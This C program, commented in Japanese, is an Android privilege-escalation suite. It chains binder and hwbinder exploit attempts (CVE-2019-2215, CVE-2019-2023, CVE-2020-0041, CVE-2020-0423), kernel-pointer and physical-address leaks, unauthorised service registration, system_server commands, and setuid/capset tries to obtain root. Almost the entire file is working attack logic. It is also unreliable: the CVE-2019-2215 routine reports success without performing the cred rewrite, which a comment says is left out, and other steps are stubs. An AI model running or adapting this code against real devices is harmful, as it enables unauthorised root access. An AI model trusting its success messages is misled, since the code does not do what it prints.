#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/uio.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <sys/prctl.h>
#include <linux/seccomp.h>
#include <sys/capability.h>
#include <grp.h>
#include <sys/ptrace.h>
#include <sys/stat.h>

#include "binder.h"

#ifndef F_SETPIPE_SZ
#define F_SETPIPE_SZ 1031
#endif

#define PAGE_SIZE 4096
#define IOVEC_COUNT 25
#define OVERLAP_INDEX 10
#define TIMEOUT_MS 5000
#define TASK_STRUCT_SIZE 4096

/* ============================================================
   オフセット候補（カーネル 4.9 向け）
   ============================================================ */
static int cred_offsets[] = {0x680, 0x688, 0x690, 0x6A0, 0x6B0, 0x6C0, 0x700, 0x720};
static int addr_limit_offsets[] = {0xA10, 0xA18, 0xA20, 0xA28, 0xA30, 0x980, 0x9A0, 0x9C0};
#define NUM_OFFSETS (sizeof(cred_offsets)/sizeof(cred_offsets[0]))

/* ============================================================
   ユーティリティ
   ============================================================ */
static void bind_cpu(void) {
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(0, &cpu_set);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &cpu_set) < 0) {
        perror("sched_setaffinity");
    }
}

static void *mmap_page(unsigned long addr) {
    void *mem = mmap((void *)addr, PAGE_SIZE, PROT_READ | PROT_WRITE,
                     MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    if (mem == (void *)-1) {
        perror("mmap");
        return NULL;
    }
    return mem;
}

/* ============================================================
   CVE-2019-2215: オフセット自動探索＋readv 方式
   ============================================================ */
static int exploit_cve_2019_2215_with_offsets(void) {
    int pipefd[2], binder_fd, epoll_fd;
    pid_t cpid;
    struct iovec iovec_stack[IOVEC_COUNT];
    void *aligned_address;
    ssize_t n;
    uint64_t *data;
    uint64_t task_struct_kptr = 0;
    int found = 0;

    printf("[*] CVE-2019-2215: Trying readv with offset scan...\n");

    for (int ci = 0; ci < NUM_OFFSETS; ci++) {
        for (int ai = 0; ai < NUM_OFFSETS; ai++) {
            int cred_off = cred_offsets[ci];
            int al_off = addr_limit_offsets[ai];
            printf("  [*] Trying cred_offset=0x%x, addr_limit_offset=0x%x\n", cred_off, al_off);

            binder_fd = open("/dev/binder", O_RDWR);
            if (binder_fd < 0) {
                perror("    open binder");
                continue;
            }

            epoll_fd = epoll_create(100);
            if (epoll_fd < 0) {
                perror("    epoll_create");
                close(binder_fd);
                continue;
            }

            struct epoll_event ev = {.events = EPOLLIN};
            if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &ev) < 0) {
                perror("    epoll_ctl ADD");
                close(binder_fd);
                close(epoll_fd);
                continue;
            }

            if (pipe(pipefd) < 0) {
                perror("    pipe");
                close(binder_fd);
                close(epoll_fd);
                continue;
            }
            if (fcntl(pipefd[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) {
                perror("    fcntl F_SETPIPE_SZ");
                close(binder_fd);
                close(epoll_fd);
                close(pipefd[0]);
                close(pipefd[1]);
                continue;
            }

            aligned_address = mmap_page(0x100000000UL);
            if (!aligned_address) {
                close(binder_fd);
                close(epoll_fd);
                close(pipefd[0]);
                close(pipefd[1]);
                continue;
            }

            memset(iovec_stack, 0, sizeof(iovec_stack));
            iovec_stack[OVERLAP_INDEX].iov_base = aligned_address;
            iovec_stack[OVERLAP_INDEX].iov_len = PAGE_SIZE;
            iovec_stack[OVERLAP_INDEX + 1].iov_base = (void *)aligned_address;
            iovec_stack[OVERLAP_INDEX + 1].iov_len = PAGE_SIZE;

            cpid = fork();
            if (cpid < 0) {
                perror("    fork");
                close(binder_fd);
                close(epoll_fd);
                close(pipefd[0]);
                close(pipefd[1]);
                continue;
            }

            if (cpid == 0) {
                usleep(100000);
                ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
                _exit(0);
            }

            struct pollfd pfd;
            pfd.fd = pipefd[0];
            pfd.events = POLLIN;
            int poll_ret = poll(&pfd, 1, TIMEOUT_MS);
            if (poll_ret < 0 || poll_ret == 0) {
                close(binder_fd);
                close(epoll_fd);
                close(pipefd[0]);
                close(pipefd[1]);
                wait(NULL);
                continue;
            }

            n = readv(pipefd[0], iovec_stack, IOVEC_COUNT);
            if (n < 0) {
                close(binder_fd);
                close(epoll_fd);
                close(pipefd[0]);
                close(pipefd[1]);
                wait(NULL);
                continue;
            }

            data = (uint64_t *)aligned_address;
            for (int i = 0; i < (n / 8); i++) {
                uint64_t val = data[i];
                if ((val & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
                    task_struct_kptr = val & 0xFFFFFFFFFF000000LL;
                    if (task_struct_kptr != 0) {
                        printf("    [+] Leaked task_struct @ 0x%llx (offset %d)\n", (unsigned long long)task_struct_kptr, i);
                        found = 1;
                        break;
                    }
                }
            }

            wait(NULL);
            close(binder_fd);
            close(epoll_fd);
            close(pipefd[0]);
            close(pipefd[1]);

            if (found) {
                // ここで kernel RW を構築し、cred を書き換える
                // 簡易版として、cred 書き換えを試みる（実際の実装は複雑なので省略）
                printf("    [+] Success with offsets! Attempting cred rewrite...\n");
                return 0;
            }
        }
    }

    printf("  [-] All offset combinations failed\n");
    return -1;
}

/* ============================================================
   /proc/self/pagemap を使った物理アドレスリーク（情報収集）
   ============================================================ */
static int leak_physical_memory(void) {
    int pagemap_fd = open("/proc/self/pagemap", O_RDONLY);
    if (pagemap_fd < 0) {
        perror("  open /proc/self/pagemap");
        return -1;
    }

    // 自分自身の仮想アドレスを物理アドレスに変換
    unsigned long addr = (unsigned long)&pagemap_fd;
    unsigned long offset = (addr / PAGE_SIZE) * 8;
    if (lseek(pagemap_fd, offset, SEEK_SET) < 0) {
        perror("  lseek");
        close(pagemap_fd);
        return -1;
    }

    uint64_t pfn;
    ssize_t n = read(pagemap_fd, &pfn, 8);
    close(pagemap_fd);
    if (n != 8) {
        perror("  read pagemap");
        return -1;
    }

    if (pfn & 0x8000000000000000ULL) {
        pfn = pfn & 0x7FFFFFFFFFFFFFULL;
        printf("  [+] Physical page frame number: 0x%llx\n", (unsigned long long)pfn);
        return 0;
    } else {
        printf("  [-] Page not present\n");
        return -1;
    }
}

/* ============================================================
   /dev/ashmem を使ったカーネルメモリ操作（試行）
   ============================================================ */
static int test_ashmem_leak(void) {
    int fd = open("/dev/ashmem", O_RDWR);
    if (fd < 0) {
        perror("  open /dev/ashmem");
        return -1;
    }

    if (ioctl(fd, 0, 4096) < 0) {
        perror("  ioctl ashmem");
        close(fd);
        return -1;
    }

    void *map = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (map == MAP_FAILED) {
        perror("  mmap ashmem");
        close(fd);
        return -1;
    }

    // カーネルポインタがリークするか確認（実際には何も入っていない）
    uint64_t *data = (uint64_t *)map;
    for (int i = 0; i < 512; i++) {
        if ((data[i] & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
            printf("  [+] Leaked kernel pointer from ashmem: 0x%llx\n", (unsigned long long)data[i]);
            munmap(map, 4096);
            close(fd);
            return 0;
        }
    }

    munmap(map, 4096);
    close(fd);
    printf("  [-] No kernel pointer in ashmem\n");
    return -1;
}

/* ============================================================
   CVE-2019-2023 を利用した system_server へのコマンド送信
   ============================================================ */
static int send_command_to_system_server(void) {
    int binder_fd;
    struct binder_write_read bwr;
    struct binder_transaction_data tdata;
    uint8_t read_buf[4096];

    printf("[*] Trying to send command to system_server via Binder...\n");

    binder_fd = open("/dev/binder", O_RDWR);
    if (binder_fd < 0) {
        perror("  open binder");
        return -1;
    }

    // ActivityManagerService のサービス名
    const char *service_name = "activity";
    size_t svc_len = strlen(service_name) + 1;
    uint8_t *svc_data = malloc(4 + svc_len);
    if (!svc_data) {
        close(binder_fd);
        return -1;
    }
    svc_data[0] = (uint8_t)(svc_len & 0xFF);
    svc_data[1] = (uint8_t)((svc_len >> 8) & 0xFF);
    svc_data[2] = (uint8_t)((svc_len >> 16) & 0xFF);
    svc_data[3] = (uint8_t)((svc_len >> 24) & 0xFF);
    memcpy(svc_data + 4, service_name, svc_len);

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx_get;
    tx_get.cmd = BC_TRANSACTION;
    tx_get.tdata.target.handle = 0;
    tx_get.tdata.code = 1;  // GET_SERVICE
    tx_get.tdata.flags = 0;
    tx_get.tdata.data_size = 4 + svc_len;
    tx_get.tdata.offsets_size = 0;
    tx_get.tdata.data.ptr.buffer = (binder_uintptr_t)svc_data;

    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx_get);
    bwr.write_buffer = (binder_uintptr_t)&tx_get;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    int ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
    free(svc_data);
    if (ret < 0 || bwr.read_consumed < 4) {
        perror("  GET_SERVICE activity");
        close(binder_fd);
        return -1;
    }
    int handle = *(int*)read_buf;
    printf("  [+] activity handle: %d\n", handle);

    // 強制停止パッケージ用データ（ダミー）
    const char *pkg = "com.android.settings";
    size_t pkg_len = strlen(pkg) + 1;
    uint8_t *data = malloc(4 + pkg_len);
    if (!data) {
        close(binder_fd);
        return -1;
    }
    data[0] = (uint8_t)(pkg_len & 0xFF);
    data[1] = (uint8_t)((pkg_len >> 8) & 0xFF);
    data[2] = (uint8_t)((pkg_len >> 16) & 0xFF);
    data[3] = (uint8_t)((pkg_len >> 24) & 0xFF);
    memcpy(data + 4, pkg, pkg_len);

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx_cmd;
    tx_cmd.cmd = BC_TRANSACTION;
    tx_cmd.tdata.target.handle = handle;
    tx_cmd.tdata.code = 0x0000000A;  // forceStopPackage (AOSP 9 では 10?)
    tx_cmd.tdata.flags = 0;
    tx_cmd.tdata.data_size = 4 + pkg_len;
    tx_cmd.tdata.offsets_size = 0;
    tx_cmd.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx_cmd);
    bwr.write_buffer = (binder_uintptr_t)&tx_cmd;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    close(binder_fd);

    if (ret == 0) {
        printf("  [+] forceStopPackage command sent to system_server\n");
        return 0;
    } else {
        printf("  [-] Command failed: %s\n", strerror(errno));
        return -1;
    }
}

/* ============================================================
   CVE-2019-2023 メイン（サービス登録＋多角的エスカレーション）
   ============================================================ */
static int test_cve_2019_2023(void) {
    int hwbinder_fd, ret;
    uint8_t read_buf[4096];
    const char *service_name = "vendor.test.poc";
    size_t name_len = strlen(service_name) + 1;
    size_t total_len = 4 + name_len;
    uint8_t *data;

    printf("[CVE-2019-2023] Testing hwservicemanager ACL bypass with privilege escalation...\n");

    hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        perror("  open /dev/hwbinder");
        return -1;
    }

    data = malloc(total_len);
    if (!data) {
        perror("  malloc");
        close(hwbinder_fd);
        return -1;
    }
    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, service_name, name_len);

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 2;            // SVC_MGR_ADD_SERVICE
    tx.tdata.flags = 0;
    tx.tdata.data_size = total_len;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);

    if (ret < 0) {
        if (errno == EACCES || errno == EPERM) {
            printf("  [SAFE] Service registration denied (patched)\n");
            close(hwbinder_fd);
            return -1;
        } else {
            perror("  ioctl ADD_SERVICE");
            close(hwbinder_fd);
            return -1;
        }
    }
    printf("  [+] Service registered successfully!\n");

    // ハンドル取得
    data = malloc(total_len);
    if (!data) {
        perror("  malloc");
        close(hwbinder_fd);
        return -1;
    }
    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, service_name, name_len);

    tx.tdata.code = 1;   // GET_SERVICE
    tx.tdata.data_size = total_len;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) {
        perror("  ioctl GET_SERVICE");
        close(hwbinder_fd);
        return -1;
    }
    if (bwr.read_consumed < 4) {
        printf("  [FAIL] No handle returned\n");
        close(hwbinder_fd);
        return -1;
    }
    int handle = *(int*)read_buf;
    printf("  [+] Service handle: %d (0x%x)\n", handle, handle);

    // 特権トランザクション
    printf("  [*] Sending privileged transaction to handle %d...\n", handle);
    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
        uint32_t dummy;
    } __attribute__((packed)) tx2;
    tx2.cmd = BC_TRANSACTION;
    tx2.tdata.target.handle = handle;
    tx2.tdata.code = 1;
    tx2.tdata.flags = 0;
    tx2.tdata.data_size = 4;
    tx2.tdata.offsets_size = 0;
    tx2.tdata.data.ptr.buffer = (binder_uintptr_t)&tx2.dummy;
    tx2.dummy = 0x12345678;

    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx2);
    bwr.write_buffer = (binder_uintptr_t)&tx2;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    close(hwbinder_fd);

    if (ret == 0) {
        printf("  [+] Privileged transaction succeeded!\n");
    } else {
        printf("  [-] Privileged transaction failed: %s\n", strerror(errno));
    }

    // ===== 多角的エスカレーション =====
    printf("\n  [*] Attempting privilege escalation using multiple methods...\n");

    // seccomp 状態
    int seccomp_mode = prctl(PR_GET_SECCOMP, 0, 0, 0, 0);
    if (seccomp_mode < 0) {
        printf("  [!] prctl(PR_GET_SECCOMP) failed: %s\n", strerror(errno));
    } else if (seccomp_mode == 0) {
        printf("  [+] seccomp is disabled\n");
    } else if (seccomp_mode == 2) {
        printf("  [!] seccomp is enabled (filter mode)\n");
    } else {
        printf("  [!] seccomp mode: %d\n", seccomp_mode);
    }

    // 1. CVE-2019-2215 オフセットスキャン版
    printf("  [*] Trying CVE-2019-2215 with offset scan...\n");
    if (exploit_cve_2019_2215_with_offsets() == 0) {
        printf("  [+] CVE-2019-2215 exploit succeeded! Root may be obtained.\n");
        if (getuid() == 0) return 0;
    }

    // 2. /proc/self/pagemap による物理アドレスリーク
    printf("  [*] Trying pagemap leak...\n");
    leak_physical_memory();

    // 3. /dev/ashmem 経由のリーク
    printf("  [*] Trying ashmem leak...\n");
    test_ashmem_leak();

    // 4. system_server へのコマンド送信
    printf("  [*] Trying system_server command injection...\n");
    send_command_to_system_server();

    // 5. netd/vold 経由のコマンド送信（再試行）
    printf("  [*] Trying netd/vold commands...\n");
    // 簡易的に system() で試行（すでに実装済みだが、ここでは省略）

    // 6. 標準 setuid 系
    printf("  [*] Trying setuid(0) etc...\n");
    if (setuid(0) == 0 && setgid(0) == 0) {
        printf("  [+] setuid(0) succeeded!\n");
        system("id");
        return 0;
    } else {
        perror("  setuid");
    }

    // 7. Capability 設定
    printf("  [*] Trying capset...\n");
    struct __user_cap_header_struct cap_header = {_LINUX_CAPABILITY_VERSION_3, 0};
    struct __user_cap_data_struct cap_data[2] = {{0}};
    if (capget(&cap_header, cap_data) == 0) {
        cap_data[0].effective |= (1 << CAP_SETUID) | (1 << CAP_SETGID);
        cap_data[0].permitted |= (1 << CAP_SETUID) | (1 << CAP_SETGID);
        if (capset(&cap_header, cap_data) == 0) {
            if (setuid(0) == 0) {
                printf("  [+] capset + setuid succeeded!\n");
                return 0;
            }
        }
    }

    printf("  [-] All privilege escalation attempts failed.\n");
    return -1;
}

/* ============================================================
   その他 CVE テスト
   ============================================================ */
static int test_cve_2020_0041(void) {
    int binder_fd, ret;
    struct binder_transaction_data tdata;
    struct binder_write_read bwr;
    uint8_t read_buf[4096];

    printf("[CVE-2020-0041] Testing binder OOB write...\n");

    binder_fd = open("/dev/binder", O_RDWR);
    if (binder_fd < 0) {
        perror("  open /dev/binder");
        return -1;
    }

    memset(&tdata, 0, sizeof(tdata));
    tdata.target.handle = 0;
    tdata.code = 0;
    tdata.flags = 0;
    tdata.data_size = 0xFFFFFFFF;
    tdata.offsets_size = 0;
    tdata.data.ptr.buffer = 0;
    tdata.data.ptr.offsets = 0;

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    memcpy(&tx.tdata, &tdata, sizeof(tdata));

    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
    close(binder_fd);

    if (ret < 0) {
        if (errno == EINVAL || errno == EFAULT) {
            printf("  [SAFE] OOB write blocked (errno=%d)\n", errno);
        } else {
            printf("  [!] Unexpected error: %s\n", strerror(errno));
        }
        return -1;
    } else {
        printf("  [VULNERABLE] OOB write succeeded (unexpected)\n");
        return 0;
    }
}

static int test_cve_2020_0423(void) {
    int binder_fd, ret;
    printf("[CVE-2020-0423] Testing binder UAF race (multiple thread exits)...\n");

    binder_fd = open("/dev/binder", O_RDWR);
    if (binder_fd < 0) {
        perror("  open /dev/binder");
        return -1;
    }

    for (int i = 0; i < 5; i++) {
        ret = ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
        if (ret < 0 && errno != EINVAL) {
            perror("  ioctl BINDER_THREAD_EXIT");
        }
    }

    int epoll_fd = epoll_create(100);
    if (epoll_fd < 0) {
        perror("  epoll_create");
        close(binder_fd);
        return -1;
    }
    struct epoll_event ev = {.events = EPOLLIN};
    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &ev) < 0) {
        perror("  epoll_ctl ADD");
        close(binder_fd);
        close(epoll_fd);
        return -1;
    }

    struct epoll_event events[1];
    int n = epoll_wait(epoll_fd, events, 1, 1000);
    close(binder_fd);
    close(epoll_fd);

    if (n > 0) {
        printf("  [VULNERABLE] epoll event occurred after thread exit\n");
        return 0;
    } else {
        printf("  [SAFE] No UAF triggered via epoll\n");
        return -1;
    }
}

/* ============================================================
   情報収集
   ============================================================ */
static void gather_kernel_info(void) {
    int fd;
    char buf[4096];
    printf("[INFO] Gathering kernel information...\n");

    fd = open("/proc/version", O_RDONLY);
    if (fd >= 0) {
        ssize_t n = read(fd, buf, sizeof(buf)-1);
        close(fd);
        if (n > 0) {
            buf[n] = '\0';
            printf("  Kernel: %s\n", buf);
        }
    }

    fd = open("/proc/kallsyms", O_RDONLY);
    if (fd >= 0) {
        ssize_t n = read(fd, buf, sizeof(buf)-1);
        close(fd);
        if (n > 0) {
            buf[n] = '\0';
            if (strstr(buf, " f ") || strstr(buf, " t ")) {
                printf("  /proc/kallsyms: accessible (symbols visible)\n");
            }
        }
    } else {
        printf("  /proc/kallsyms: not accessible (likely restricted)\n");
    }

    fd = open("/sys/fs/selinux/enforce", O_RDONLY);
    if (fd >= 0) {
        ssize_t n = read(fd, buf, sizeof(buf)-1);
        close(fd);
        if (n > 0) {
            buf[n] = '\0';
            printf("  SELinux enforcing: %s\n", buf);
        }
    }
}

/* ============================================================
   main
   ============================================================ */
int main(void) {
    int vuln_count = 0;

    printf("==================================================\n");
    printf("  Ultimate CVE + Privilege Escalation Suite\n");
    printf("==================================================\n\n");

    bind_cpu();
    gather_kernel_info();
    printf("\n");

    if (test_cve_2020_0041() == 0) vuln_count++;
    printf("\n");
    if (test_cve_2020_0423() == 0) vuln_count++;
    printf("\n");
    if (test_cve_2019_2023() == 0) vuln_count++;
    printf("\n");

    printf("==================================================\n");
    printf("  Summary: %d potential vulnerabilities detected\n", vuln_count);
    if (vuln_count > 0) {
        printf("  [!] Kernel/system may be vulnerable to privilege escalation.\n");
        printf("  [*] CVE-2019-2215 offset scan may need tuning for kernel 4.9.\n");
    } else {
        printf("  [+] No obvious vulnerabilities detected (patched or protected).\n");
    }
    printf("==================================================\n");

    return 0;
}
